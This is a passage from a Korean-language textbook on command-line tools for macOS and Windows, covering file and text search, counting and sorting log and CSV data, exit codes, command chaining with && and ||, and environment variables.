for line in fileinput.input(encoding="utf-8"):
    number = fileinput.filelineno()
    line = line.rstrip("\n")
    # ... 아래는 그대로 ...
```

`fileinput.input()`은 명령행 인자(`sys.argv[1:]`)에 파일 이름이 있으면 그 파일들을 차례로 읽고, 없으면 표준 입력을 읽는다. `encoding="utf-8"`은 파일을 읽을 때의 인코딩이다(파이썬 3.10 이상). `fileinput.filelineno()`는 지금 읽는 파일 안에서의 줄 번호다. 이제 두 셸에서 같은 명령을 쓴다.

```
# macOS
python3 clean.py practice/transactions.csv | grep ',식비,' | python3 sum_amounts.py

# Windows
python clean.py practice/transactions.csv | Select-String ',식비,' -Raw | python sum_amounts.py
```

> **`head`가 먼저 끝나면 — `BrokenPipeError`**
> macOS에서 `python3 clean.py practice/transactions.csv | head -n 3`을 실행하면 세 줄이 나온 뒤 `BrokenPipeError: [Errno 32] Broken pipe`라는 traceback이 붙는다. `head`는 세 줄을 받자마자 끝나 버리는데, `clean.py`는 계속 쓰려다가 "받을 사람이 없는 파이프"에 쓰게 되었기 때문이다. 결과는 맞게 나왔으니 지금은 무시해도 된다. 오래 쓸 필터라면 이 예외를 잡아서 조용히 끝내도록 만든다.

### 3.2.1 파일 이름으로 찾기

**macOS — `find`**

```
# macOS
cd project
find . -name "*.py"
```

```
./main.py
./ledger/storage.py
./ledger/__init__.py
./ledger/core.py
./.venv/lib/site-packages/rich/__init__.py
./.venv/lib/site-packages/urllib3/__init__.py
./.venv/lib/site-packages/requests/__init__.py
```

`find`의 모양은 `find 어디서부터 조건`이다. `.`(현재 폴더)부터 시작해 안쪽 폴더를 모두 뒤지며, 조건에 맞는 것의 경로를 출력한다. 숨김 폴더(`.venv`)도 뒤진다.

`"*.py"`를 **따옴표로 감싸야** 한다. 2.6.4에서 본 것처럼 zsh는 따옴표 없는 `*.py`를 먼저 현재 폴더의 파일 이름으로 펼친다. 지금 폴더에 `main.py`가 있으므로 `find . -name main.py`가 실행되어 `main.py`만 찾게 된다. 와일드카드를 `find`에게 그대로 넘겨야 `find`가 모든 폴더에서 그 패턴을 찾는다.

자주 쓰는 조건은 다음과 같다.

| 조건 | 뜻 | 예 |
|---|---|---|
| `-name 패턴` | 이름이 패턴과 맞는 것(대소문자 구분) | `-name "*.csv"` |
| `-iname 패턴` | 대소문자를 구분하지 않고 | `-iname "readme*"` |
| `-type f` / `-type d` | 파일만 / 폴더만 | `-type d -name "__pycache__"` |
| `-not -path 패턴` | 경로가 패턴과 맞는 것은 빼고 | `-not -path "*/.venv/*"` |
| `-size +크기` | 크기가 그보다 큰 것 | `-size +1M` |
| `-mtime -일수` | 최근 며칠 안에 고친 것 | `-mtime -1` |

조건을 여러 개 적으면 모두 만족하는 것만 찾는다. 가상환경 안의 파일을 빼고 내 코드만 찾는다.

```
# macOS
find . -name "*.py" -not -path "*/.venv/*"
```

```
./main.py
./ledger/storage.py
./ledger/__init__.py
./ledger/core.py
```

`__pycache__` 폴더가 어디 있는지 찾는다.

```
# macOS
find . -type d -name "__pycache__"
```

```
./ledger/__pycache__
```

> `find`에는 찾은 것을 지우는 `-delete` 옵션도 있다. 인터넷에서 `find . -name "__pycache__" -exec rm -r {} +` 같은 명령도 자주 보인다. 이런 명령은 반드시 **지우는 부분을 빼고 먼저 실행해서** 무엇이 찾아지는지 확인한 뒤에 쓴다. 2.4.4에서 본 대로 터미널에서 지운 것은 휴지통에 가지 않는다.

**Windows — `Get-ChildItem -Recurse`**

```
# Windows
cd project
Get-ChildItem -Recurse -Filter *.py -Name
```

```
main.py
.venv\lib\site-packages\requests\__init__.py
.venv\lib\site-packages\rich\__init__.py
.venv\lib\site-packages\urllib3\__init__.py
ledger\__init__.py
ledger\core.py
ledger\storage.py
```

`-Recurse`는 안쪽 폴더까지, `-Filter`는 이름 패턴, `-Name`은 객체 대신 상대 경로만 보여 달라는 뜻이다. `-Filter`의 패턴은 PowerShell이 아니라 cmdlet이 해석하므로 따옴표 없이 써도 된다(2.6.4). Windows에서는 `.`으로 시작하는 폴더가 숨김이 아니므로 `.venv`도 뒤진다. Git이 만드는 `.git` 폴더처럼 숨김 속성이 있는 폴더까지 뒤지려면 `-Force`를 더한다.

| 매개변수 | 뜻 | 예 |
|---|---|---|
| `-Filter 패턴` | 이름이 패턴과 맞는 것(대소문자 구분 안 함) | `-Filter *.csv` |
| `-File` / `-Directory` | 파일만 / 폴더만 | `-Directory -Filter __pycache__` |
| `-Force` | 숨김 항목도 | |
| `-Name` | 상대 경로 문자열로 출력 | |

가상환경을 빼는 매개변수는 없다. 파이프로 `Where-Object`를 이어서 걸러 낸다. `Where-Object`는 객체의 속성을 조건으로 걸러 내는 cmdlet이다.

```
# Windows
Get-ChildItem -Recurse -Filter *.py | Where-Object FullName -notlike '*\.venv\*' | Select-Object FullName
```

`FullName`은 파일의 전체 경로 속성이고, `-notlike '*\.venv\*'`는 "경로에 `\.venv\`가 들어 있지 않은 것"이다. 3.1.4에서 본 객체 파이프의 전형적인 모양이다. 내보내고(`Get-ChildItem`) → 거르고(`Where-Object`) → 고른다(`Select-Object`).

`__pycache__` 폴더를 찾는다.

```
# Windows
Get-ChildItem -Recurse -Directory -Filter __pycache__ | Select-Object FullName
```

### 3.2.2 내용으로 찾기

**macOS — `grep`**

`grep`은 파일에서 패턴이 든 줄을 찾아 출력한다. `practice` 폴더로 돌아와 `access.log`에서 상태 코드 `404`가 든 줄을 찾는다.

```
# macOS
cd ..
grep ' 404 ' access.log | head -n 3
```

```
2026-11-13T09:00:25 GET /favicon.ico 404 88ms
2026-11-13T09:00:27 GET /favicon.ico 404 297ms
2026-11-13T09:00:43 GET /favicon.ico 404 154ms
```

패턴을 `' 404 '`처럼 공백까지 넣어 따옴표로 감쌌다. `404`만 쓰면 응답 시간 `404ms`나 요청 경로의 숫자에도 걸린다. "찾고 싶은 것만 걸리는 패턴"을 고르는 것이 `grep`을 잘 쓰는 요령이다.

자주 쓰는 옵션은 다음과 같다.

| 옵션 | 뜻 |
|---|---|
| `-n` | 줄 번호를 붙인다 |
| `-i` | 대소문자를 구분하지 않는다 |
| `-v` | 패턴이 **없는** 줄을 출력한다 |
| `-c` | 줄 대신 맞는 줄의 **수**를 출력한다 |
| `-w` | 낱말 전체가 맞을 때만(`TODO`는 찾고 `TODOS`는 빼고) |
| `-F` | 패턴을 정규 표현식이 아니라 글자 그대로 |
| `-r` | 폴더 안의 파일을 모두 뒤진다 |
| `-l` | 줄 대신 맞는 줄이 있는 **파일 이름**만 |
| `-A 수` / `-B 수` / `-C 수` | 맞는 줄의 뒤 / 앞 / 앞뒤 몇 줄도 함께 |
| `--include=패턴` / `--exclude-dir=폴더` | 이 이름의 파일만 / 이 폴더는 빼고(`-r`과 함께) |

`grep`의 패턴은 **정규 표현식**(regular expression)이다. 글자를 그대로 찾는 것이 아니라 "글자의 모양"을 찾는다. 4장에서 VS Code의 검색과 함께 맛보기로 다루고, 여기서는 두 가지만 쓴다.

| 기호 | 뜻 | 예 |
|---|---|---|
| `^` | 줄의 맨 앞 | `^2026-`는 `2026-`로 **시작하는** 줄 |
| `.` | 아무 글자 하나 | `2026.08`은 `2026-08`, `2026/08` 모두 |

이 둘과 `-v`로 `transactions.csv`에서 날짜 형식이 틀린 줄을 찾는다. 모든 줄은 `2026-`로 시작해야 한다. 그렇지 **않은** 줄을 줄 번호와 함께 찾는다.

```
# macOS
grep -vn '^2026-' transactions.csv
```

```
1:date,kind,category,memo,amount
120002:2026/08/03,지출,교통,버스,1500
```

20만 줄 중에서 날짜가 이상한 줄이 바로 나왔다. 첫 줄은 열 이름이므로 정상이다. 금액이 숫자가 아닌 줄도 찾아본다.

```
# macOS
grep -n 'N/A' transactions.csv
```

```
51235:2026-07-15,지출,식비,점심,N/A
```

`-c`로 센다. 식비 거래는 몇 줄인가?

```
# macOS
grep -c ',식비,' transactions.csv
```

```
27091
```

3.1.7에서 구한 식비 건수는 27,090건이었다. 하나가 많은 것은 `N/A` 줄도 `,식비,`를 포함하기 때문이다.

**Windows — `Select-String`**

`Select-String`은 PowerShell의 `grep`이다. 기본 출력은 `파일:줄 번호:내용`이다. 줄 번호를 붙이는 옵션이 따로 필요 없다.

```
# Windows
cd ..
Select-String ' 404 ' access.log | Select-Object -First 3
```

```
access.log:26:2026-11-13T09:00:25 GET /favicon.ico 404 88ms
access.log:28:2026-11-13T09:00:27 GET /favicon.ico 404 297ms
access.log:44:2026-11-13T09:00:43 GET /favicon.ico 404 154ms
```

| grep | Select-String | 뜻 |
|---|---|---|
| (기본) | `-CaseSensitive` | 대소문자 구분 |
| `-i` | (기본) | 대소문자 구분 안 함 |
| `-v` | `-NotMatch` | 패턴이 없는 줄 |
| `-c` | `(Select-String ...).Count` | 맞는 줄의 수 |
| `-F` | `-SimpleMatch` | 글자 그대로 |
| `-l` | `-List`(파일마다 첫 줄만) | 맞는 파일 |
| `-C 2` | `-Context 2` | 앞뒤 줄도 |
| (줄만 출력) | `-Raw` | 결과 객체 대신 줄 문자열만 |

**가장 큰 차이는 대소문자다.** `grep`은 기본으로 대소문자를 **구분하고**, `Select-String`은 기본으로 **구분하지 않는다.** 인터넷에서 본 `grep` 명령을 `Select-String`으로 옮기면 더 많은 줄이 나올 수 있다.

날짜 형식이 틀린 줄과 `N/A` 줄을 찾는다. 패턴은 `grep`과 같은 정규 표현식이다.

```
# Windows
Select-String -NotMatch '^2026-' transactions.csv
Select-String 'N/A' transactions.csv
(Select-String ',식비,' transactions.csv).Count
```

```
transactions.csv:1:date,kind,category,memo,amount
transactions.csv:120002:2026/08/03,지출,교통,버스,1500
transactions.csv:51235:2026-07-15,지출,식비,점심,N/A
27091
```

폴더 전체에서 찾을 때는 `Get-ChildItem -Recurse`로 파일을 고른 다음 파이프로 `Select-String`에 넘긴다. 3.2.1의 거르기를 그대로 쓴다.

```
# Windows

Get-ChildItem -Recurse -Filter *.py | Where-Object FullName -notlike '*\.venv\*' | Select-String TODO
```

```

ledger\core.py:2:    # TODO: 수입과 지출을 나누어 더하기
ledger\core.py:7:    # TODO: 분류별 합계
ledger\storage.py:7:    # todo: 인코딩 확인
```

대소문자를 구분하지 않아서 `# todo:`도 나왔다. `-CaseSensitive`를 붙이면 세 줄이 된다.

`API_KEY`를 찾는 것도 해 본다. `.env`도 `.`으로 시작하지만 Windows에서는 숨김 파일이 아니므로 `Get-ChildItem -Recurse -File`에 포함된다.

```

```

```

```

### 3.2.3 세기·정렬·중복 세기

`access.log`에서 상태 코드별로 몇 번씩 나왔는지 세어 본다. "오류가 났다"보다 "3,000건 중 `500`이 44건"이 훨씬 쓸모 있는 정보다. `practice` 폴더로 돌아와서 한다.

**macOS — `cut | sort | uniq -c | sort`**

네 명령을 잇는다. 한 단계씩 붙여 가며 중간 결과를 본다.

**1단계. 상태 코드 칸만 잘라 낸다.** `cut -d' ' -f4`는 "공백(`-d' '`)으로 나눈 넷째 칸(`-f4`)"이다.

```
# macOS
cd ..
cut -d' ' -f4 access.log | head -n 5
```

```
200
200
200
200
200
```

**2단계. 같은 것끼리 센다.** `uniq -c`는 같은 줄이 이어지면 하나로 합치고 그 수를 앞에 붙인다. 그런데 바로 붙이면 이상한 결과가 나온다.

```
# macOS
cut -d' ' -f4 access.log | uniq -c | head -n 5
```

```
  13 200
   1 302
   4 200
   1 500
   1 200
```

`uniq`는 **바로 이웃한** 같은 줄만 합친다. `200`이 13번 이어지다가 `302`가 끼면 거기서 끊긴다. 그래서 `uniq` 앞에는 거의 언제나 `sort`를 둔다. 정렬하면 같은 값이 모두 이웃하게 된다.

```
# macOS
cut -d' ' -f4 access.log | sort | uniq -c
```

```
2714 200
 107 302
 135 404
  44 500
```

**3단계. 많은 순서로 정렬한다.** `sort -rn`은 숫자로(`-n`), 큰 것부터(`-r`) 정렬한다. 줄 맨 앞의 숫자(센 횟수)를 기준으로 정렬된다.

```
# macOS
cut -d' ' -f4 access.log | sort | uniq -c | sort -rn
```

```
2714 200
 135 404
 107 302
  44 500
```

`cut | sort | uniq -c | sort -rn`은 "무엇이 몇 번 나왔나"를 묻는 거의 모든 질문에 쓰는 관용구다. 칸 번호만 바꾸면 경로별 요청 수도 바로 나온다(`cut -d' ' -f3`). CSV라면 구분자를 쉼표로 바꾼다. 가계부의 분류별 거래 수를 센다.

```
# macOS
cut -d, -f3 transactions.csv | sort | uniq -c | sort -rn
```

```
27353 교육
27299 교통
27272 의료
27096 통신
27091 식비
27085 문화
26961 주거
4937 월급
4906 부수입
   1 category
```

마지막 줄의 `category`는 열 이름 줄이다. `tail -n +2`로 첫 줄을 건너뛰고 시작하면 빠진다(`tail -n +2 transactions.csv | cut -d, -f3 | ...`). `-n +2`는 "둘째 줄부터 끝까지"라는 뜻이다.

`sort`의 옵션은 다음과 같다.

| 옵션 | 뜻 |
|---|---|
| (없음) | 글자 순서로 정렬 |
| `-n` | 숫자로 정렬(`10`이 `9`보다 뒤) |
| `-r` | 거꾸로 |
| `-t 구분자 -k 번호` | 구분자로 나눈 몇째 칸을 기준으로 |
| `-u` | 정렬하면서 중복은 하나만 |

`-n` 없이 숫자를 정렬하면 글자 순서가 되어 `10`이 `9`보다 앞에 온다. 첫 글자 `1`이 `9`보다 앞이기 때문이다. 숫자를 정렬할 때는 `-n`을 잊지 않는다.

`wc`는 줄·낱말·바이트를 센다. 대개 `-l`(줄 수)만 쓴다.

```
# macOS
wc -l access.log transactions.csv
```

```
    3000 access.log
  200001 transactions.csv
  203001 total
```

**Windows — `Import-Csv`와 `Group-Object`**

PowerShell에는 `wc`와 `uniq`가 없다. `sort`는 있지만 2.1.4의 `ls`처럼 `Sort-Object`의 **별칭**이라서 옵션이 다르다. 인터넷의 `sort -rn`을 그대로 입력하면 2장에서 본 오류가 난다.

```
# Windows
cd ..
Get-Content access.log | sort -rn
```

```
Sort-Object: A parameter cannot be found that matches parameter name 'rn'.
```

PowerShell에서는 칸을 잘라 내는 대신 **줄을 객체로 바꾼 다음** 속성으로 다룬다. CSV를 객체로 읽는 `Import-Csv`가 그 일을 한다. `access.log`는 쉼표가 아니라 공백으로 나뉘어 있고 열 이름 줄이 없으므로, 구분자와 열 이름을 직접 알려 준다.

```
# Windows
$log = Import-Csv access.log -Delimiter ' ' -Header time, method, path, status, ms
$log | Select-Object -First 2
```

```
time   : 2026-11-13T09:00:00
method : GET
path   : /items
status : 200
ms     : 283ms

time   : 2026-11-13T09:00:01
method : GET
path   : /
status : 200
ms     : 247ms
```

`$log = ...`는 결과를 변수 `$log`에 담아 두는 PowerShell 문법이다. 한 번 읽어 두고 여러 번 쓸 수 있다. 줄마다 `time`, `method`, `path`, `status`, `ms` 속성을 가진 객체가 되었다. 이제 `status` 속성으로 묶어서 센다.

```
# Windows
$log | Group-Object status -NoElement | Sort-Object Count -Descending
```

```
Count Name
----- ----
 2714 200
  135 404
  107 302
   44 500
```

`Group-Object status`는 `status`가 같은 객체끼리 묶고 그 수(`Count`)를 센다. 정렬하지 않아도 이웃하지 않은 것까지 묶는다. `-NoElement`는 묶인 객체 목록은 빼고 수만 보여 달라는 뜻이다. 빼지 않으면 `Group` 열에 객체가 잔뜩 붙어 나온다. 다른 칸으로 세려면 속성 이름만 바꾼다(`Group-Object path`).

`transactions.csv`는 첫 줄에 열 이름이 있으므로 `Import-Csv`가 알아서 속성 이름으로 쓴다. 열 이름 줄이 결과에 섞이지도 않는다.

```
# Windows
Import-Csv transactions.csv | Group-Object category -NoElement | Sort-Object Count -Descending
```

```
Count Name
----- ----
27353 교육
27299 교통
27272 의료
27096 통신
27091 식비
27085 문화
26961 주거
 4937 월급
 4906 부수입
```

20만 줄을 객체로 만드느라 몇 초 걸린다. 객체는 편리한 대신 글자보다 무겁다.

조건으로 걸러서 셀 때는 `Where-Object`를 끼운다. `500`이 난 요청 수, 그중 경로별 수를 센다.

```
# Windows
($log | Where-Object status -eq 500).Count
$log | Where-Object status -eq 404 | Group-Object path -NoElement
```

```
44

Count Name
----- ----
  135 /favicon.ico
```

`-eq`는 "같다"는 비교 연산자다. PowerShell의 비교 연산자는 `==`가 아니라 `-eq`(같다), `-ne`(다르다), `-gt`(크다), `-lt`(작다), `-like`(와일드카드), `-match`(정규 표현식)처럼 생겼다.

줄 수는 다음과 같이 센다.

```
# Windows
(Get-Content access.log).Count
Get-Content access.log | Measure-Object -Line
```

```
3000

Lines Words Characters Property
----- ----- ---------- --------
 3000
```

`(Get-Content 파일).Count`는 파일 전체를 메모리에 읽어서 줄의 수를 센다. 몇십 MB까지는 괜찮다. `Measure-Object -Line`은 **빈 줄을 세지 않는다.** 빈 줄이 섞인 파일에서는 `wc -l`과 결과가 다를 수 있다.

정리하면 다음과 같다.

| 하는 일 | macOS(zsh) | Windows(PowerShell 7) |
|---|---|---|
| 줄 수 | `wc -l 파일` | `(Get-Content 파일).Count` |
| 칸 꺼내기 | `cut -d 구분자 -f 번호` | `Import-Csv 파일`(구분자 `-Delimiter`, 열 이름 `-Header`) → 속성 |
| 정렬 | `sort`, `sort -n`, `sort -rn` | `Sort-Object`, `Sort-Object 속성 -Descending` |
| 같은 것끼리 세기 | `sort \| uniq -c \| sort -rn` | `Group-Object 속성 -NoElement \| Sort-Object Count -Descending` |
| 조건으로 거르기 | `grep 패턴` | `Where-Object 속성 -eq 값` |
| 앞의 몇 개 / 뒤의 몇 개 | `head -n 3` / `tail -n 3` | `Select-Object -First 3` / `-Last 3` |
| 중복 없이 | `sort -u` | `Sort-Object -Unique` |

### 3.2.4 큰 CSV를 열기 전에

20만 줄짜리 `transactions.csv`를 엑셀이나 VS Code로 바로 여는 것은 좋은 첫걸음이 아니다. 엑셀은 1,048,576행을 넘는 파일을 끝까지 열지 못하고, VS Code는 큰 파일을 열면 일부 기능을 꺼 버린다. "데이터 처리 기초"에서 pandas로 읽을 때도 파일 전체가 메모리에 올라간다. 파일이 수백 MB, 수 GB라면 열기만 하다가 컴퓨터가 멈출 수 있다.

데이터 파일을 받으면 열기 전에 터미널에서 다음 네 가지를 먼저 확인하는 습관을 들인다.

**1. 크기**

```
# macOS
ls -lh transactions.csv

# Windows
Get-Item transactions.csv | Select-Object Name, Length
```

```
# macOS
-rw-r--r--  1 jinyoung  staff   7.5M Nov 13 10:00 transactions.csv

# Windows
Name             Length
----             ------
transactions.csv 7907041
```

**2. 줄 수** — 행이 몇 개인지. 첫 줄이 열 이름이면 데이터는 한 줄 적다.

```
# macOS
wc -l transactions.csv

# Windows
(Get-Content transactions.csv).Count
```

```
200001
```

**3. 앞부분과 끝부분** — 열 이름, 구분자(쉼표인지 탭인지), 날짜와 숫자의 모양, 따옴표를 쓰는지.

```
# macOS
head -n 5 transactions.csv

# Windows
Get-Content transactions.csv -TotalCount 5
```

```
date,kind,category,memo,amount
2026-08-16,지출,교통,버스,44000
2026-08-16,지출,교육,책,16000
2026-03-06,지출,주거,관리비,59000
2026-11-25,지출,교육,책,27500
```

`tail`(Windows `-Tail`)로 끝부분도 본다. 파일이 중간에 잘리지 않았는지, 끝에 합계 줄 같은 것이 붙어 있지 않은지 확인한다.

**4. 형식이 틀린 줄** — 3.2.2의 방법으로 "모든 줄이 이래야 한다"는 규칙을 하나 정하고 그 규칙을 어기는 줄을 찾는다. 날짜로 시작하지 않는 줄(`grep -vn '^2026-'`), 숫자가 아닌 금액(`grep -n 'N/A'`), 분류별 개수(`cut | sort | uniq -c`)에서 처음 보는 값 등이다. 3.2.3의 분류별 개수에는 이상한 값이 없었지만, 구분(`kind`) 칸으로 세어 보면 이상한 값이 하나 보인다. 실습 3-2에서 찾는다.

이렇게 확인하는 데 1분이면 충분하다. 그 1분으로 "왜 합계가 안 맞지"를 한 시간 동안 찾는 일을 막는다.

**ripgrep**(`rg`)은 `grep -r`을 대신하려고 만든 검색 도구다. 많은 개발자가 쓰고, AI 코딩 도구 중에도 코드를 검색할 때 내부에서 ripgrep을 쓰는 것이 많다. 설치한다.

```

```

```
7:    # TODO: 분류별 합계
```

`grep -rn TODO --include="*.py" --exclude-dir=.venv .`이 하던 일을 `rg TODO` 세 글자가 했다. ripgrep은 기본으로 다음을 한다.

- 폴더 안을 모두 뒤지고, 줄 번호를 붙이고, 파일별로 묶어서 보여 준다.
- 숨김 파일과 숨김 폴더(`.venv`, `.env`)를 건너뛴다. 보려면 `--hidden`을 붙인다.

옵션은 `grep`과 비슷하다. `-i`(대소문자 무시), `-w`(낱말 전체), `-l`(파일 이름만), `-c`(개수), `-F`(글자 그대로), `-g "*.py"`(이 이름의 파일만)를 쓸 수 있다. 대소문자는 `grep`처럼 기본으로 구분한다. `rg -i todo`로 `storage.py`의 소문자 `todo`도 찾아보자.

## 3.3 종료 코드와 명령 연결

### 3.3.1 종료 코드 다시 보기

1.3.4에서 본 것처럼 프로그램은 끝날 때 **종료 코드**(exit code)라는 정수 하나를 남긴다. `0`은 성공, 그 밖의 값은 실패다. 화면의 메시지는 사람이 읽고, 종료 코드는 **다른 프로그램이** 읽는다. 셸, 스크립트, GitHub Actions, 그리고 AI 코딩 도구가 "방금 실행한 명령이 성공했나"를 판단하는 근거가 종료 코드다.

| | zsh(macOS) | PowerShell 7(Windows) |
|---|---|---|
| 앞 명령의 종료 코드(숫자) | `$?` | `$LASTEXITCODE`(외부 프로그램만) |
| 앞 명령이 성공했나(참·거짓) | `$?`가 `0`인가 | `$?`(`True`/`False`, cmdlet과 외부 프로그램 모두) |

```
# macOS
python3 -c "import sys; sys.exit(3)"
echo $?
echo $?

# Windows
python -c "import sys; sys.exit(3)"
$LASTEXITCODE
$?
```

```
# macOS
3
0

# Windows
3
True
```

macOS에서 `echo $?`를 두 번 실행하니 두 번째는 `0`이다. `$?`는 **바로 앞 명령**의 종료 코드인데, 두 번째 `echo $?`의 바로 앞 명령은 첫 번째 `echo`였고 그것은 성공했다. 종료 코드는 확인하고 싶은 명령 **바로 다음에** 본다. Windows에서도 `$?`가 `True`인 것은 바로 앞의 `$LASTEXITCODE`를 출력하는 일이 성공했기 때문이다. `$LASTEXITCODE`는 외부 프로그램이 실행될 때만 바뀌므로 그사이에 cmdlet을 몇 개 실행해도 값이 남아 있다.

종료 코드의 값에는 관례가 있다.

| 값 | 흔한 뜻 | 예 |
|---|---|---|
| `0` | 성공 | |
| `1` | 일반적인 실패 | 파이썬에서 처리하지 않은 예외로 끝났을 때, 기초 과정의 `check_samples.py`가 실패했을 때 |
| `2` | 사용법이 틀렸다 | 기초 과정 `main.py`에 인자를 주지 않았을 때, `grep`에 없는 옵션을 줬을 때 |
| `130` | `Ctrl+C`로 멈췄다(macOS·리눅스) | 2.3.3에서 `Ctrl+C`로 멈춘 파이썬(Windows에서는 `-1073741510`이라는 큰 음수) |

**`grep`의 종료 코드**

`grep`은 종료 코드를 조금 특별하게 쓴다. 찾았으면 `0`, **못 찾았으면 `1`**, 파일이 없는 등의 오류면 `2`다.

`~/devtools-lab/ch03`에서 실행한다.

```
# macOS
grep -q '지츨' practice/transactions.csv
echo $?
grep -q '지출금액' practice/transactions.csv
echo $?
```

```
0
1
```

`-q`(quiet)는 아무것도 출력하지 않고 종료 코드로만 답하라는 옵션이다. "없다"가 실패로 취급되므로, 뒤에서 배울 `&&`로 이으면 못 찾았을 때 다음 명령이 실행되지 않는다. 반면 PowerShell의 `Select-String`은 못 찾아도 실패가 아니다. 아무것도 출력하지 않을 뿐 `$?`는 `True`다.

### 3.3.2 `&&`와 `||`

**`&&`** 는 앞 명령이 **성공했을 때만** 뒤 명령을 실행한다. **`||`** 는 앞 명령이 **실패했을 때만** 뒤 명령을 실행한다. 두 셸에서 같은 문법이다(PowerShell 7부터. 1.2.3에서 본 대로 5.1에는 없다).

```
명령1 && 명령2     명령1이 성공하면 명령2를 실행한다
명령1 || 명령2     명령1이 실패하면 명령2를 실행한다
명령1 ; 명령2      명령1의 결과와 상관없이 명령2를 실행한다
```

`&&`가 가장 많이 쓰인다. "앞 단계가 성공해야 의미가 있는" 단계들을 잇는다.

```
mkdir build && cd build
python -m pip install -r requirements.txt && python main.py samples/2026-10.csv
```

첫 줄에서 `mkdir`가 실패하면(폴더가 이미 있다는 등) `cd`는 실행되지 않는다. 둘째 줄에서 설치가 실패하면 프로그램을 실행하지 않는다. 설치 오류 메시지가 화면 위로 밀려 올라가 버리는 일도 막는다.

`;`로 이었다면 앞 명령이 실패해도 뒤 명령이 실행된다. 특히 `cd 폴더 ; rm -r *`처럼 쓰면, `cd`가 실패했을 때 **엉뚱한 폴더에서** 지우기가 실행된다. 이어서 실행할 명령이 앞 명령의 성공에 기대고 있다면 언제나 `&&`로 잇는다.

`||`는 실패했을 때 알려 주거나 대신할 일을 적는다.

```
python check_samples.py || echo "시험 실패: 요약을 만들지 않는다"
```

둘을 섞어 `명령1 && 명령2 || 명령3`처럼 쓰면 "명령1이 성공하면 명령2, 아니면 명령3"처럼 읽히지만 정확히는 그렇지 않다. **명령2가 실패해도** 명령3이 실행된다. 셸은 왼쪽부터 차례로 "바로 앞의 결과"만 보기 때문이다. 조건에 따라 갈라지는 일이 필요하면 3.6의 스크립트로 쓴다.

> **PowerShell의 `&&`는 `$?`를 본다**
> PowerShell의 `&&`와 `||`는 앞 명령의 `$?`로 판단한다. 외부 프로그램은 종료 코드가 `0`이면 `$?`가 `True`이므로 zsh와 같게 동작한다. 그런데 cmdlet은 "명령이 오류 없이 실행되었나"가 `$?`다. 예를 들어 `Test-Path`는 경로가 있는지를 `True`/`False`로 **출력**하는 cmdlet이다. 경로가 없어도 확인하는 일 자체는 성공했으므로 `$?`는 `True`다. 그래서 `Test-Path .venv && "가상환경이 있다"`는 `.venv`가 없어도 `False`를 출력한 다음 `가상환경이 있다`를 출력한다. cmdlet의 **결과 값**에 따라 갈라지려면 3.6의 `if`를 쓴다.

### 3.3.3 `check_samples.py`가 종료 코드 1로 끝나는 이유

기초 과정 10장의 `check_samples.py`는 하나라도 실패하면 마지막에 `sys.exit(1)`을 실행했다. 화면에는 이미 `[실패]`가 출력되는데 왜 종료 코드까지 1로 해야 할까? 직접 실험한다. `ch03` 폴더에 다음 스크립트를 만든다.

```python
# check_demo.py — 시험 스크립트를 흉내 낸다
# python check_demo.py pass   → 통과, 종료 코드 0
# python check_demo.py silent → 실패를 화면에만 알리고 종료 코드 0
# python check_demo.py fail   → 실패를 화면에 알리고 종료 코드 1
import sys

mode = sys.argv[1]
if mode == "pass":
    print("[통과] 2026-10.csv")
else:
    print("[실패] 2026-10.csv")
    if mode == "fail":
        sys.exit(1)
```

세 가지로 실행하고, 성공하면 다음 단계(여기서는 `echo`로 흉내 낸 "요약 만들기")로 가게 `&&`로 잇는다.

```
python check_demo.py pass && echo "요약을 만든다"
python check_demo.py silent && echo "요약을 만든다"
python check_demo.py fail && echo "요약을 만든다"
```

```
[통과] 2026-10.csv
요약을 만든다
[실패] 2026-10.csv
요약을 만든다
[실패] 2026-10.csv
```

`silent`는 `[실패]`라고 출력하고도 종료 코드 0으로 끝났다. 셸은 화면의 글자를 읽지 않으므로 성공으로 보고 다음 단계를 실행했다. 사람이 그 자리에서 화면을 보고 있었다면 알아챘겠지만, 이 명령이 스크립트 안에서, GitHub Actions에서, 또는 AI 코딩 도구가 "시험을 돌리고 통과하면 다음 작업"을 하는 중에 실행되었다면 아무도 실패를 알아채지 못한다.

**실패는 종료 코드로 알린다.** 메시지는 사람에게, 종료 코드는 프로그램에게 하는 말이다. 직접 만드는 명령행 프로그램과 검사 스크립트는 언제나 이 약속을 지킨다. 7장의 `git bisect run`, 중급 과정의 GitHub Actions, 이 장 3.6의 스크립트가 모두 이 약속에 기댄다.

## 3.4 셸 환경

### 3.4.1 환경 변수 보기와 정하기

1.3.2에서 환경 변수는 운영체제가 프로그램에게 넘겨주는 **이름=값** 쌍이고, 터미널에서 정한 값은 그 창에서만 유효하다고 했다. 이번에는 조금 더 들어가 본다.

| 하는 일 | zsh(macOS) | PowerShell 7(Windows) |
|---|---|---|
| 모두 보기 | `env` | `Get-ChildItem Env:` |
| 하나 보기 | `echo $HOME`, `printenv HOME` | `$env:USERPROFILE` |
| 이름으로 찾기 | `env \| grep PY` | `Get-ChildItem Env:PY*` |
| 정하기 | `export NAME=값` | `$env:NAME = "값"` |
| 한 명령에만 정하기 | `NAME=값 명령` | (없다. 정하고 실행한 뒤 지운다) |
| 지우기 | `unset NAME` | `Remove-Item Env:NAME` |

```
# macOS
env | head -n 5

# Windows
Get-ChildItem Env: | Select-Object -First 5
```

환경 변수는 생각보다 많다. 사용자 이름, 홈 폴더, 언어 설정, 임시 폴더, 그리고 다음 절의 `PATH`까지 수십 개가 늘 프로그램에 넘어간다.

**셸 변수와 환경 변수는 다르다**

zsh에서 `export` 없이 `이름=값`이라고만 쓰면, 그 값은 **셸 안에서만** 쓰는 셸 변수가 된다. 셸이 실행하는 프로그램에는 넘어가지 않는다.

```
# macOS
LAB_COLOR=blue
echo $LAB_COLOR
python3 -c "import os; print(os.getenv('LAB_COLOR'))"
export LAB_COLOR
python3 -c "import os; print(os.getenv('LAB_COLOR'))"
```

```
blue
None
blue
```

셸은 `blue`를 알고 있지만 파이썬은 `None`을 받았다. `export`를 해야 **환경 변수**가 되어 셸이 실행하는 프로그램에 넘어간다. 그래서 1.3.2에서 `export LAB_USER=영희`라고 썼다.

PowerShell도 같다. `$LAB_COLOR = "blue"`는 PowerShell 변수이고, `$env:LAB_COLOR = "blue"`가 환경 변수다. 앞에 `env:`가 붙어야 프로그램에 넘어간다.

zsh에는 **명령 하나에만** 환경 변수를 주는 문법이 있다. 명령 앞에 `이름=값`을 붙인다.

```
# macOS
LAB_MODE=test python3 -c "import os; print(os.getenv('LAB_MODE'))"
echo "[$LAB_MODE]"
```

```
test
[]
```

